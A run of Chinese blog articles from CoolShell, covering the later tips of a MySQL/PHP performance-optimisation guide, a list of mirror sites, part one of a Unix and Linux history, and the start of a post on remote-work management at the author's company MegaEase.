虽然最新版本的MySQL在传输Prepared Statements是使用二进制形势，所以这会使得网络传输非常有效率。当然，也有一些情况下，我们需要避免使用Prepared Statements，因为其不支持查询缓存。但据说版本5.1后支持了。在PHP中要使用prepared statements，你可以查看其使用手册：mysqli 扩展 或是使用数据库抽象层，如： PDO.// 创建 prepared statement     if ($stmt = $mysqli->prepare("SELECT username FROM user WHERE state=?")) {// 绑定参数     $stmt->bind_param("s", $state);// 执行     $stmt->execute();// 绑定结果     $stmt->bind_result($username);// 移动游标     $stmt->fetch();printf("%s is from %s\n", $username, $state);$stmt->close();     }#### 13\. 无缓冲的查询
正常的情况下，当你在当你在你的脚本中执行一个SQL语句的时候，你的程序会停在那里直到没这个SQL语句返回，然后你的程序再往下继续执行。你可以使用无缓冲查询来改变这个行为。关于这个事情，在PHP的文档中有一个非常不错的说明： mysql_unbuffered_query() 函数：> “mysql_unbuffered_query() sends the SQL query query to MySQL without > automatically fetching and buffering the result rows as mysql_query() does. > This saves a considerable amount of memory with SQL queries that produce > large result sets, and you can start working on the result set immediately > after the first row has been retrieved as you don’t have to wait until the > complete SQL query has been performed.”
上面那句话翻译过来是说，mysql_unbuffered_query() 发送一个SQL语句到MySQL而并不像mysql_query()一样去自动fethch和缓存结果。这会相当节约很多可观的内存，尤其是那些会产生大量结果的查询语句，并且，你不需要等到所有的结果都返回，只需要第一行数据返回的时候，你就可以开始马上开始工作于查询结果了。然而，这会有一些限制。因为你要么把所有行都读走，或是你要在进行下一次的查询前调用 mysql_free_result() 清除结果。而且， mysql_num_rows() 或 mysql_data_seek() 将无法使用。所以，是否使用无缓冲的查询你需要仔细考虑。#### 14\. 把IP地址存成 UNSIGNED INT很多程序员都会创建一个 VARCHAR(15) 字段来存放字符串形式的IP而不是整形的IP。如果你用整形来存放，只需要4个字节，并且你可以有定长的字段。而且，这会为你带来查询上的优势，尤其是当你需要使用这样的WHERE条件：IP between ip1 and ip2。我们必需要使用UNSIGNED INT，因为 IP地址会使用整个32位的无符号整形。
而你的查询，你可以使用 INET_ATON() 来把一个字符串IP转成一个整形，并使用 INET_NTOA() 把一个整形转成一个字符串IP。在PHP中，也有这样的函数 ip2long() 和 long2ip()。#### 15\. 固定长度的表会更快如果表中的所有字段都是“固定长度”的，整个表会被认为是 “static” 或 “fixed- length”。 例如，表中没有如下类型的字段： VARCHAR，TEXT，BLOB。只要你包括了其中一个这些字段，那么这个表就不是“固定长度静态表”了，这样，MySQL 引擎会用另一种方法来处理。固定长度的表会提高性能，因为MySQL搜寻得会更快一些，因为这些固定的长度是很容易计算下一个数据的偏移量的，所以读取的自然也会很快。而如果字段不是定长的，那么，每一次要找下一条的话，需要程序找到主键。并且，固定长度的表也更容易被缓存和重建。不过，唯一的副作用是，固定长度的字段会浪费一些空间，因为定长的字段无论你用不用，他都是要分配那么多的空间。使用“垂直分割”技术（见下一条），你可以分割你的表成为两个一个是定长的，一个则是不定长的。#### 16\. 垂直分割
“垂直分割”是一种把数据库中的表按列变成几张表的方法，这样可以降低表的复杂度和字段的数目，从而达到优化的目的。（以前，在银行做过项目，见过一张表有100多个字段，很恐怖）**示例一** ：在Users表中有一个字段是家庭地址，这个字段是可选字段，相比起，而且你在数据库操作的时候除了个人信息外，你并不需要经常读取或是改写这个字段。那么，为什么不把他放到另外一张表中呢？ 这样会让你的表有更好的性能，大家想想是不是，大量的时候，我对于用户表来说，只有用户ID，用户名，口令，用户角色等会被经常使用。小一点的表总是会有好的性能。**示例二** ： 你有一个叫 “last_login” 的字段，它会在每次用户登录时被更新。但是，每次更新时会导致该表的查询缓存被清空。所以，你可以把这个字段放到另一个表中，这样就不会影响你对用户ID，用户名，用户角色的不停地读取了，因为查询缓存会帮你增加很多性能。另外，你需要注意的是，这些被分出去的字段所形成的表，你不会经常性地去Join他们，不然的话，这样的性能会比不分割时还要差，而且，会是极数级的下降。#### 17\. 拆分大的 DELETE 或 INSERT 语句
如果你需要在一个在线的网站上去执行一个大的 DELETE 或 INSERT 查询，你需要非常小心，要避免你的操作让你的整个网站停止相应。因为这两个操作是会锁表的，表一锁住了，别的操作都进不来了。Apache 会有很多的子进程或线程。所以，其工作起来相当有效率，而我们的服务器也不希望有太多的子进程，线程和数据库链接，这是极大的占服务器资源的事情，尤其是内存。如果你把你的表锁上一段时间，比如30秒钟，那么对于一个有很高访问量的站点来说，这30秒所积累的访问进程/线程，数据库链接，打开的文件数，可能不仅仅会让你泊WEB服务Crash，还可能会让你的整台服务器马上掛了。所以，如果你有一个大的处理，你定你一定把其拆分，使用 LIMIT 条件是一个好的方法。下面是一个示例：while (1) {     //每次只做1000条     mysql_query("DELETE FROM logs WHERE log_date <= '2009-11-01' LIMIT 1000");     if (mysql_affected_rows() == 0) {     // 没得可删了，退出！     break;     }     // 每次都要休息一会儿     usleep(50000);     }
#### 18\. 越小的列会越快对于大多数的数据库引擎来说，硬盘操作可能是最重大的瓶颈。所以，把你的数据变得紧凑会对这种情况非常有帮助，因为这减少了对硬盘的访问。参看 MySQL 的文档 Storage Requirements 查看所有的数据类型。如果一个表只会有几列罢了（比如说字典表，配置表），那么，我们就没有理由使用 INT 来做主键，使用 MEDIUMINT, SMALLINT 或是更小的 TINYINT 会更经济一些。如果你不需要记录时间，使用 DATE 要比 DATETIME 好得多。当然，你也需要留够足够的扩展空间，不然，你日后来干这个事，你会死的很难看，参看Slashdot的例子（2009年11月06日），一个简单的ALTER TABLE语句花了3个多小时，因为里面有一千六百万条数据。#### 19\. 选择正确的存储引擎在 MySQL 中有两个存储引擎 MyISAM 和 InnoDB，每个引擎都有利有弊。酷壳以前文章《MySQL: InnoDB 还是 MyISAM?》讨论和这个事情。MyISAM 适合于一些需要大量查询的应用，但其对于有大量写操作并不是很好。甚至你只是需要update一个字段，整个表都会被锁起来，而别的进程，就算是读进程都无法操作直到读操作完成。另外，MyISAM 对于 SELECT COUNT(*) 这类的计算是超快无比的。
InnoDB 的趋势会是一个非常复杂的存储引擎，对于一些小的应用，它会比 MyISAM 还慢。他是它支持“行锁” ，于是在写操作比较多的时候，会更优秀。并且，他还支持更多的高级应用，比如：事务。下面是MySQL的手册* target=”_blank”MyISAM Storage Engine   * InnoDB Storage Engine#### 20\. 使用一个对象关系映射器（Object Relational Mapper）使用 ORM (Object Relational Mapper)，你能够获得可靠的性能增涨。一个ORM可以做的所有事情，也能被手动的编写出来。但是，这需要一个高级专家。ORM 的最重要的是“Lazy Loading”，也就是说，只有在需要的去取值的时候才会去真正的去做。但你也需要小心这种机制的副作用，因为这很有可能会因为要去创建很多很多小的查询反而会降低性能。ORM 还可以把你的SQL语句打包成一个事务，这会比单独执行他们快得多得多。目前，个人最喜欢的PHP的ORM是：Doctrine。#### 21\. 小心“永久链接”“永久链接”的目的是用来减少重新创建MySQL链接的次数。当一个链接被创建了，它会永远处在连接的状态，就算是数据库操作已经结束了。而且，自从我们的Apache开始重用它的子进程后——也就是说，下一次的HTTP请求会重用Apache的子进程，并重用相同的 MySQL 链接。
* PHP手册：mysql_pconnect()在理论上来说，这听起来非常的不错。但是从个人经验（也是大多数人的）上来说，这个功能制造出来的麻烦事更多。因为，你只有有限的链接数，内存问题，文件句柄数，等等。而且，Apache 运行在极端并行的环境中，会创建很多很多的了进程。这就是为什么这种“永久链接”的机制工作地不好的原因。在你决定要使用“永久链接”之前，你需要好好地考虑一下你的整个系统的架构。文章：来源（全文完）# 推荐几个镜像站点作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn搜狐的：网易的：上海交通大学FTP：http://202.38.97.230如果你是教育网的用户，上海交通大学FTP访问速度非常的快。:)# Unix传奇(上篇)作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn【本文曾于2007年3月于我在CSDN上的BLOG发布，现在我把其搬到酷壳来，一来是觉得这段历史相当传奇，值得大家再看看，二来也和我在酷壳上发布的一些文章相互链接。】* * *了解过去，我们才能知其然，更知所以然。总结过去，我们才会知道我们明天该如何去规划，该如何去走。在时间的滚轮中，许许多的东西就像流星一样一闪而逝，而有些东西却能经受着时间的考验散发着经久的魅力，让人津津乐道，流传至今。要知道明天怎么去选择，怎么去做，不是盲目地跟从今天各种各样琳琅满目前沿技术，而应该是去 —— 认认真真地了解和回顾历史。
Unix是目前还在存活的操作系统的元老了，走过了40年的历程（参看《Unix 40年：Unix年鉴》、《Unix 40年：昨天，今天和明天》）。在技术更新如此迅速的计算机世界的今天，Unix始终保持它那神圣的光环，它那曲折和令人叹息的历史，以及由它引发的思想变革，对当今计算机文化造成的深远影响，这40年所产生的人和事，让它成为了一个传奇，不能不让人为之惊叹。这是一段所有从事计算机行业人员尤其是软件开发人员需要了解的历史。Unix的传奇历史是整个计算机世界文化最具代表性的，它对整个计算机世界文化的影响也是最巨大，最深远的。他给人带来的不单单的对过去的回味，更为我们带来了计算机世界的新思潮。了解这段的历史的人，才能体会计算机世界变迁过程中的是是非非，才能了解计算机世界中的文化，从而才能参与到整个计算机革命的大潮中。希望这段历史，这篇文章能让你感受到计算机世界那强力的脉搏，从而让你踏上这条令人充满激情的道路。**上篇*** Unix起源   * Unix分裂   * Unix的法律纠纷   * GNU开源组织   * Linux横空出世   * Linux今天的领袖**下篇*** Unix与黑客文化   * Unix的历史教训   * Unix 家族谱   * Unix的特点   * Unix的影响和哲学   * Unix痛恨者手册
### Unix 起源回顾Unix历史，我们就要说一下一个叫MULTICS（Multiplexed Information and Computing Service）的项目。上世纪六十年代时，大部份计算机都是采用批处理（Batch Processing）的方式（也就是说，当作业积累一定数量的时候，计算机才会进行处理）。那时，我们熟知的美国电话及电报公司（American Telephone and Telegraph Inc.；AT&T）、通用电器公司（General Electrics；G.E.）及麻省理工学院（Massachusetts Institute of Technology；MIT）计划合作开发一个多用途（General-Purpose）、分时（Time-Sharing）及多用户（Multi- User）的操作系统，也就是这个MULTICS，其被设计运行在GE-645大型主机上。不过，这个项目由于太过复杂，整个目标过于庞大，糅合了太多的特性，进展太慢，几年下来都没有任何成果，而且性能都很低。于是到了1969年2月，贝尔实验室（Bell Labs）决定退出这个项目。熟悉这段历史的人都知道，贝尔实验室中的有个叫Ken Thompson的人，他为MULTICS这个操作系统写游戏了个叫“Space Travel”的游戏，在MULTICS上经过实际运行后，他发现游戏速度很慢而且耗费昂贵 —— 每次运行会花费75美元。退出这个项目以后。他为了让这个游戏能玩，所以他找来Dennis Ritchie为这个游戏开发一个极其简单的操作系统。这就是后来的Unix。（值得一提的是，当时他们本想在DEC-10上写，后来没有申请到，只好在实验室的墙角边找了一台被人遗弃的Digital PDP-7的迷你计算机进行他们的计划，这台计算机上连个操作系统都没有，于是他们用汇编语言仅一个月的时间就开发了一个操作系统的原型）他们的同事Brian Kernighan非常不喜欢这个系统，嘲笑Ken Thompson说：“你写的系统好真差劲，干脆叫Unics算了。”Unics的名字就是相对于MULTICS的一种戏称，后业改成了Unix。于是，Unix就在这样被游戏和玩笑创造了，当时是1969年8月。也就是这一年，Linux之父Linus Torvalds在芬兰出生了。
1971年，Ken Thompson写了充分长篇的申请报告，申请到了一台PDP-11/24的机器。于是Unix第一版出来了。在一台PDP-11/24的机器上完成。这台电脑只有24KB的物理内存和500K磁盘空间。Unix占用了12KB的内存，剩下的一半内存可以支持两用户进行Space Travel的游戏。而著名的fork()系统调用也就是在这时出现的。到了1973年的时候，Ken Thompson 与Dennis Ritchie感到用汇编语言做移植太过于头痛，他们想用高级语言来完成第三版，对于当时完全以汇编语言来开发程序的年代，他们的想法算是相当的疯狂。一开始他们想尝试用Fortran，可是失败了。后来他们用一个叫BCPL（Basic Combined Programming Language）的语言开发，他们整合了BCPL形成B语言，后来Dennis Ritchie觉得B语言还是不能满足要求，就是就改良了B语言，这就是今天的大名鼎鼎的C语言。于是，Ken Thompson 与Dennis Ritchie成功地用C语言重写了Unix的第三版内核。至此，Unix这个操作系统修改、移植相当便利，为Unix日后的普及打下了坚实的基础。而Unix和C完美地结合成为一个统一体，C与Unix很快成为世界的主导。
Unix的第一篇文章 “The UNIX Time Sharing System”由Ken Thompson和DennisRitchie于1974年7月的 the Communications of the ACM发表。这是UNIX与外界的首次接触。结果引起了学术界的广泛兴趣并对其源码索取，所以，Unix第五版就以“仅用于教育目的”的协议，提供给各大学作为教学之用，成为当时操作系统课程中的范例教材。各大学公司开始通过Unix源码对Unix进行了各种各样的改进和扩展。于是，Unix开始广泛流行。Ken Thompson & Dennis Ritchie### Unix分裂1978年，对 Unix而言是革命性的一年；因为学术界的老大柏克利大学 （UC Berkeley），推出了一份以第六版为基础，加上一些改进和新功能而成的 Unix。这就是著名的“1 BSD（1st Berkeley Software Distribution）”，开创了Unix的另一个分支：BSD 系列。 同时期，AT&T成立USG（Unix Support Group），将 Unix变成商业化的产品。从此，BSD的 Unix 便和AT&T 的Unix 分庭抗礼，Unix就分为System IV和4.x BSD这两大主流，各自蓬勃发展。
1979年发布的Unix 第七版被称为是“最后一个真正的Unix”，这个版本的Unix内核只有40K bytes。后来这个版本被移植到VAX机上（我在大学时学习C语言时用过这个VAX机，我还记得那时上VAX机最大的爱好就是使用talk命令和别人聊天，呵呵）。20世纪80年代相继发布的8、9、10版本只授权给了少数大学。1982年，AT&T基于版本7开发了UNIX System Ⅲ的第一个版本，这是一个商业版本仅供出售。为了解决混乱的UNIX版本情况，AT&T综合了其他大学和公司开发的各种UNIX，开发了UNIX System V Release 1。这个新的UNIX商业发布版本不再包含源代码，所以加州大学Berkeley分校继续开发BSD UNIX，作为UNIX System III和V的替代选择。BSD对UNIX最重要的贡献之一是TCP/IP。BSD 有8个主要的发行版中包含了TCP/IP：4.1c、4.2、4.3、4.3-Tahoe、4.3-Reno、Net2、4.4以及 4.4-lite。这些发布版中的TCP/IP代码几乎是现在所有系统中TCP/IP实现的前辈，包括AT&T System V UNIX 和Microsoft Windows中的TCP/IP都参照了BSD的源码。
同时，其他一些公司也开始为其自己的小型机或工作站提供商业版本的UNIX系统，有些选择System V作为基础版本，有些则选择了BSD。BSD的一名主要开发者，Bill Joy，在BSD基础上开发了SunOS，并最终创办了Sun Microsystems。Bill Joy1991年，一群BSD开发者（Donn Seeley、Mike Karels、Bill Jolitz 和 Trent Hein）离开了加州大学，创办了Berkeley Software Design, Inc (BSDI)。BSDI是第一家在便宜常见的Intel平台上提供全功能商业BSD UNIX的厂商。后来Bill Jolitz 离开了BSDI，开始了386BSD的工作。386BSD被认为是FreeBSD、OpenBSD 和 NetBSD、DragonFlyBSD的先辈。这是一个AT&T妄图私有化的Unix的时代。为了私有化Unix，1986年IEEE指定了一个委员会制定了一个一个开放作业系统的标准,称为 POSIX (Portable Operating Systems Interface)。最后加上个X，不知道是为了好听，还是因为这本质上是UNIX的标准。当然，AT&T的Unix取得了这个标准制订战争的胜利，还取得了Unix这个注册商标。此时BSD的拥护者自喻为冷酷无情的公司帝国的反抗军。就销售量来说，AT&T UNIX始终赶不上BSD/Sun。到1990年，AT&T与BSD版本已难明显区分，因为彼此都有采用对方的新发明。
这段时期，从实验室出来的被全世界所分享的Unix，正处于被私有化的关键时期。（这里有一个笑话——《Alice梦游UNIX仙境》）### Unix的法律纠纷Berkeley Software Design, Inc（BSDI）很快就与AT&T的UNIX Systems Laboratories（USL）附属公司产生了法律纠纷，USL是AT&T注册的公司。AT&T为了拥有System V版权，以及Unix商标，为了垄断Unix，1992年，USL正式对BSDI提起诉讼，说BSD剽窃他的源码。而最终了结了好评如潮的BSD系统。由于最后判决悬而未决，这桩法律诉讼将BSD后裔的开发，特别是自由软件，延迟了两年，这导致没有法律问题的Linux内核获得了极大的支持。Linux跟386BSD的开发几乎同时起步，Linus说，当时如果有自由的基于386的Unix- like操作系统，他就可能不会创造Linux。尽管无法预料这给以后的软件业究竟造成了什么样的影响（如果没有这个法律纠纷，很有可能没有今天的革命性的Linux），但有一点可以肯定，Linux更加丰富了这块土壤。这场官司一直打到 AT&T将自己的Unix系统实验室卖掉，新接手的Novell公司采取了一种比较开明的做法，允许BSDI自由发布自己的BSD，但是前提是必须将来自于AT&T的代码完全删除，于是诞生了4.4 BSD Lite版，由于这个版本不存在法律问题，4.4BSD Lite成为了现代BSD系统的基础版本。
这桩诉讼最终在1994年1月了结，更多地满足了BSDI的利益。伯克利套件的18,000个文件中，只有3个文件要求删除，另有70个文件要求修改，并显示USL的版权说明。这项调解另外要求，USL不得对4.4BSD提起诉讼，不管是用户还是BSDI代码的分发者。于是，BSD Unix走上了复兴的道路。BSD的开发也走向了几个不同的方向，并最终导致了FreeBSD、OpenBSD和NetBSD的出现。从AT&T意识到了Unix的商业价值，不再将Unix源码授权给学术机构以来，到以后的几十年，Unix仍在不断变化，其版权所有者不断变更，授权者的数量也在增加。Unix的版权曾经为AT&T所有，之后Novell拥有了Unix，再之后Novell又将版权出售给了SCO（这一事实双方尚存在争议）。有很多大公司在取得了Unix的授权之后，开发了自己的Unix产品。（几年前，据传闻微软为了限制Linux，微软让SCO到法院告Linux剽窃其源码）由于Unix是由C语言写的，所以修改和移植都很容易，因此，很多商业公司及学术机构均加入这个操作系统的研发，各个不同版本的Unix也开始蓬勃发展。这才产生了今天这么多的各式各样的Unix衍生产品。如AIX、Solaris、HP- UX、IRIX、OSF、Ultrix等等。（这些商业化的Unix基本上都是源于AT&T授权的Unix System V）
### Unix开源组织AT&T的这种商业态度，让当时许许多的Unix的爱好者和软件开发者们感到相当的痛心和忧虑，他们认为商业化的种种限制并不利于产生的发展，相反还能导制产品出现诸多的问题。随着商业化Unix的版本的种种限制和诸多问题，引起了大众的不满和反对。于是，大家开始有组织地结成“反叛联盟”以此对抗欺行罢市的AT&T等商业化行为。另一方面，关于“大教堂”（集权、封闭、受控、保密）和“集市”（分权、公开、精细的同僚复审）两种开发模式的对比成为了新思潮的中心思想。这个新思潮对IT业产生了非常深远影响。为整个计算机世界带来了革命性的价值观。此时，一个名叫Richard Stallman的领袖出现了，他认为Unix是一个相当好的操作系统，如果大家都能够将自己所学贡献出来，那么这个系统将会更加的优异！他倡导的Open Source的概念，就是针对Unix这一事实反对实验室里的产品商业化私有化。尽管Stallman既不是、也从来没有成为一个Unix程序员，但在后1980的大环境下，实现一个仿Unix操作系统成了他追求的明确战略目标。Richard Stallman早期的捐助者大都是新踏入Unix土地的老牌ARPANET黑客，他们对代码共享的使命感甚至比那些有更多Unix背景的人强烈。
为了这个理想，Richard Stallman于1984年创业了GNU，计划开发一套与Unix相互兼容的的软件。1985 年 Richard Stallman 又创立了自由软件基金会（Free Software Foundation）来为 GNU 计划提供技术、法律以及财政支持。尽管 GNU 计划大部分时候是由个人自愿无偿贡献，但 FSF 有时还是会聘请程序员帮助编写。当 GNU 计划开始逐渐获得成功时，一些商业公司开始介入开发和技术支持。当中最著名的就是之后被 Red Hat 兼并的 Cygnus Solutions。GNU组织的建立，延续了当年Unix刚出现时的情形，并为这种情形建立了可靠的法律和财务保障。GNU 工程十几年以来, 已经成为一个对软件开发主要的影响力量， 创造了无数的重要的工具。例如：强健的编译器，有力的文本编辑器，甚至一个全功能的操作系统。从那时开始，许多程序员聚集起来开始开发一个自由的、高质量、易理解的软件，让这使得Unix社区生机勃勃，一派繁荣景象。自90年代发起这个计划以来，GNU 开始大量的产生或收集各种系统所必备的组件，像是——函数库（libraries）、编译器（compilers）、调式工具（debugs）、文本编辑器（text editors）、网站服务器（web server），以及一个Unix的使用者接口（Unix shell）等等，等等。但由于种种原因，GNU一直没有开发操作系统的kernel。正当Richard Stallman在为操作系统内核伤脑筋的时候，Linux出现了。
### Linux横空出世1990年，Linus Torvalds还是芬兰赫尔辛基大学的一名学生，最初是用汇编语言写了一个在80386保护模式下处理多任务切换的程序，后来从Minix（Andy Tanenbaum教授所写的很小 的Unix操作系统,主要用于操作系统教学）得到灵感，进一步产生了自认为狂妄的想法——写一个比Minix更好的Minix，于是开始写了一些硬件的设备驱动程序，一个小的文件系统。这样0.0.1版本的Linux就出来了，但是它只具有操作系统内核的勉强的雏形，甚至不能运行，你必须在有Minix的机器上编译以后才能玩。这时候Linus已经完全着迷而不想停止，决定踢开Minix，于是在1991年10 月5号发布Linux 0.0.2版本,在这个版本中已经可以运行bash 和gcc。从一开始，Linus就决定自由扩散Linux，包括原代码，随即Linux引起黑客们（hacker）的注意，通过计算机网络加入了Linux的内核开发。Linux倾向于成为一个黑客的系统——直到今天，在Linux社区里内核的开发被认为是真正的编程。由于一批高水平黑客的加入，使Linux 发展迅猛，几乎一两个礼拜就有新版或修正版的出现，到1993年底94年初，Linux 1.0终于诞生了！Linux 1.0已经是一个功能完备的操作系统，而且内核写得紧凑高效，可以充分发挥硬件的性能，在4M内存的80386机器上也表现得非常好，至今人们还在津津乐道。时至今日，kernel的版本已经出到2.6。Linux的发展不像传统的软件工程，它完全是透过网络，集合世界各地的高手而成的一套操作系统，在这里我们也可以见识到网络快速传播的威力。Linux初次让整个世界感觉到了开源力量和网络力量的如此强大。（Linux 的标志和吉祥物是一只名字叫做 Tux 的 企鹅，标志的由来是因为Linus在澳洲时曾被一只动物园里的企鹅咬了一口，便选择了企鹅作为Linux的标志。）
Linux 的历史是和GNU紧密联系在一起的。从1983年开始的GNU计划致力于开发一个自由并且完整的类Unix操作系统，包括软件开发工具和各种应用程序。到1991年 Linux 内核发布的时候，GNU已经几乎完成了除了系统内核之外的各种必备软件的开发。在 Linus Torvalds 和其它开发人员的努力下，GNU组件可以运行于Linux内核之上。整个内核是基于 GNU 通用公共许可，也就是GPL（GNU General Public License，GNU通用公共许可证）的，但是Linux内核并不是GNU 计划的一部分。1994年3月，Linux1.0版正式发布，Marc Ewing成立了 Red Hat 软件公司，成为最著名的 Linux 分销商之一。严格来讲，Linux这个词本身只表示Linux内核，但在实际上人们已经习惯了用Linux来形容整个基于Linux内核，并且使用GNU 工程各种工具和应用程序的操作系统(也被称为GNU/Linux)。基于这些组件的Linux软件被称为Linux发行版。一般来讲，一个Linux发行套件包含大量的软件，比如软件开发工具，数据库，Web服务器（例如Apache)，X Window，桌面环境（比如GNOME和KDE），办公套件（比如OpenOffice.org），等等。
1991至1995年间，Linux从概念型的0.1版本内核原型，发展成为能够在性能和特性上均堪媲美专有Unix的操作系统，并且在连续正常工作时间等重要统计数据上打败了这些Unix中的绝大部分。1995年，Linux找到了自己的杀手级应用——开源的web服务器Apache。就像Linux，Apache出众地稳定和高效。很快，运行Apache的Linux机器成了全球ISP平台的首选。约60%的网站选用Apache，轻松击败了另两个主要的专有型竞争对手。今天的LAMP（Linux , Apache, MySQL, PHP）已经成为了架构Web服务器的主要首选。现如今的Linux不但可以装在几乎所有的主流服务器上，当然也包括桌面的X86系统中。其还常常被用于嵌入式系统，机顶盒、手机、交换机、游戏机、PDA、网络交换机、路由器、等等，都是因为Linux那精彩的内核。Linux的出现，不仅仅给世界带来了一个免费的操作系统，也不仅仅是对Unix自由、共享的文化的延续，它的出现带给了计算机世界自Unix、GNU以来更为成熟的思想和文化。### Linux今天的领袖****Linux和GNU关系是比较微妙的。那时，自由软件基金会编写的用户软件工具包铺平了一条摆脱高成本专有软件开发工具的前进道路。意识服从经济，而不是领导：一些新手加入了RMS的革命运动，高举GPL大旗，另一些人则更认同整体意义上的Unix传统，加入了反对GPL的阵营，但其他大部分人置身事外，一心编码。
Linus Torvalds巧妙地跨越了GPL和反GPL的派别之争。他利用GNU工具包搭起了自创的Linux内核，用GPL的传染性质保护它，但拒绝认同Richard Stallman的许可协议反映的思想体系计划。Linus Torvalds明确表示他认为自由软件一般情况下更好，但他偶尔也用专有软件。即使在他自己的事业中，他也拒绝成为狂热分子。这一点极大地吸引了大多数黑客，他们虽然早就反感Richard Stallman的言辞，但他们的怀疑论一直缺个有影响力或者令人信服的代言人。而Linus Torvalds正好充当了这一角色。Linus Torvalds令人愉快的实用主义及灵活而低调的行事风格，促使黑客文化在1993至1997年间取得了一连串令人惊奇的胜利，不仅仅在技术上的成功，还让围绕Linux操作系统的发行、服务和支持产业有了坚实的开端。结果，他的名望和影响也一飞冲天。Torvalds成为了互联网时代的英雄；到1995年为止，他只用了四年时间就在整个黑客文化界声名显赫，而Richard Stallman为此花了十五年，而且他还远远超过了Stallman向外界贩卖“自由软件”的记录。与Torvalds相比，Richard Stallman的言辞渐渐显得既刺耳又无力。（参看《Linus Torvalds 语录 Top 10》）
今天，我们也说不清楚是GNU Linux还是Linux GNU。Linux既不排斥开源，也不排斥商业化，Linus认为好的软件是需要免费和商业化共同推进的。正是这种革命性的想法，造就了今天的Linux火红的局面（参看《谁写了Linux》、《Linux基金会的广告》、《Linux Distribution Timeline》）。Linux就像一股清泉流入了所有人的心中，引发了很多的启迪和思考。**Unix传奇（下篇） >>>>**## **(** **转载时请注明作者和出处。未经许可，请勿用于商业用途** **)**# MegaEase的远程工作文化作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnMegaEase 是我创业的公司，主要是想把云计算（PaaS/SaaS层）的那些高可用高并发的分布式技术普及到那需要对技术自主可控的公司，这样就不需要去使用不能自主可控的闭源系统或是大公司的云平台。我于2016年开始成立MegaEase，从早期8个人，直到今天有20来个人，我们从一开始到今天都是在远程工作的公司文化。因为我很喜欢《Rework》这本书，写这本书的公司叫37signal（现名basecamp），这家公司在发《Rework》这本书的时候，整个公司只有16个人，分布在全世界8个城市，这种Geek的公司的文化很吸引我，所以，在我决定创业的时候，我就止不住地想成立这样能够远程工作的公司，于是，远程工作的团队文化就这样成为了MegaEase的基因。 **下面我会分享一下，我们公司的远程工作文化和其中的一些问题，最后还有一个工作协议** 。
我们在早期的时候，8个员工来自5个城市，现在的20来个员工来自8个城市2个国家。虽然我们现在使用“共享办公室”，但是本质上，我们的整个文化是远程工作的文化。在2017-2018年度，我们公司产品商业化以来，公司早期的8个工程师在远程工作的状态下成功支持了得到的老罗的跨年演讲活动，以及其它几个客户，一方面验证了用户愿意付费购买我们的产品和服务之后，另一方面也有一些不错的收入，客单价都在百万左右。还记得当时，有几个投资人并不相信我们连个办公室都没有，而且8个人分布在5个城市，觉得我们是个骗子公司（哈哈）。在过去的一年，我们通过我们的产品和服务帮助银行电信互联网等公司进行了他们的系统架构的改造和升级，让复杂和高门槛的分布式技术和架构可以被更多的企业所掌握所应用。这说明，远程工作是没有什么问题的。实际上远程团队远程工作真的不新鲜，Github上有个Repo维护着一个支持远程工作的公司列表，还有一个跟远程工作相关的Awesome索引。当然，自从我创业以来，我身边就一直有好些不同的声音质疑远程工作。听过他们的理由后，我能够理解他们的疑虑和困惑，因为管理的确是一个很复杂的事，因为要面对的是极为复杂的人，所以，有这些疑虑也是正常的。下面是我的一些经验和分享。先说宏观管理，再说微观实践。
目录* 宏观管理     * 一、努力找到好的人     * 二、设定共同的目标和使命     * 三、倾向使用小团队   * 微观实践   * 远程工作协议   * 小结#### 宏观管理我发现很多人比较质疑远程工作的原因，更多的是表现在对宏观的管理上有问题。所以，我还是想先说一下宏观管理，这其实并不分远程办公还是集中式办公， **如果能够解决好些这管理上的根本问题，其实，远程不远程都无所谓了。只不过，这些问题在“远程办室”的场景更更突显罢了** 。##### **一、努力找到好的人****团队管理的头等大事是找人，没有之一。** 很多人都会跟我说，你的这种远程团队需要很好的人。是的，没错，人很关键。远程团队需要的人的一般需要有这些特质：* **能独挡一面的人** 。这样交给他的事能独立完成，没有路能自己找路，这样可以省很多管理成本。   * **沟通能力很强的人** 。一方面，他们把模糊的事能变清楚，另一方面，他能有效地说服他人。不然就会非常扯皮和消耗时间。   * **能自管理和自驱动** 。不能自管理和自驱的人，会增加大量的管理和教育成本。能自驱动的人，都是对负责的事情有认同的人。
如果你仔细思考一下， **你会发现，这样的人是任何一家公司所渴望的人，和远不远程无关** 。只不过，如果是远程团队的话，你会被逼着要招到这样的人。招到这样的人，你团队的执行力会非常的强悍。招不到这样的人，你只能为他们不能自管理和自驱而招“经理”，不能写出好的代码而招“测试”，不能很好的沟通而招个“项目经理”，不能独档一面，而要把好的人安排给他们当“教练”，而好的人则会被累死……这个时候， **你就需要计算一下了，是花时间精力在教育不好的人，还是花时间精力找好的人？无论远不远程，聪明的管理者都会选择后者** 。这也就是为什么Amazon的Bezos会说，“我宁愿面50个人一个人都招不到，我也不愿意降低我的面试标准”。##### **二、设定共同的目标和使命**对于远程团队来说因为见不到面，所以，缺乏交流和沟通。所以，需要团队里所有人能在同一篇上，能够对要做的事有一个统一标准的认识。也就是共同的目标和使命的认知。知道要要什么，不要什么。知道取舍，知道trade- off。这些东西都是需要团队一起达成的共识。如果没有这样的“Same Picture”的目标和使命，就会出现很多不必要的误解和冲突。另外，因为团队和业务也在迅速发展中，所以，也需要不断地调整和沟通。这都需要领导者花费时间统一目标和使命。
老实说，无论远程不远程，一个团队也是需要有共同的目标和使命的。没有共同的目标，就算是集中在一起办公，也一样没有效率的。##### **三、倾向使用小团队**因为沟通成本的问题，远程团队更为倾向使用小团队，但并不是说小团队会限制整个公司的规模。《人月神话》说过，只有小团队才能驾驭复杂的系统。Amazon 的 Two Pizza Team的文化（团队的大小只能到两张披萨就能喂饱的大小），就是把整个系统拆成“微服务”架构，这样可以导致整体效率的巨大提升。表现在，可以并行开发，专注于一个功能更利于解决复杂问题，简单可以更容易的运维，可以更容易的规模化……我工作的这20多年来经历过很多公司，尤其是创业的这几年来，看过的公司更多了（50+以上了），我发现，人数越多的团队，基本上来说，就更偏劳动密集型。劳动密集型的一个特征就是， **大家整天在想，得整点什么事给这么多人，好让他们忙起来。而人数少的团队，因为人不够，所以每天都在想，什么样的事更重要，什么样的事可以自动化，怎么做更有效率……** 小团队和大团队的关注点就这么不一样了，所以做出来的事也就不一样了……当然，并不是说劳动密集型有什么问题，就像《软件团队的两种管理方式》一文所说的一样，远程团队工作更倾向于“电影工作组”式的每个人都是leader的知识密集型的团队。
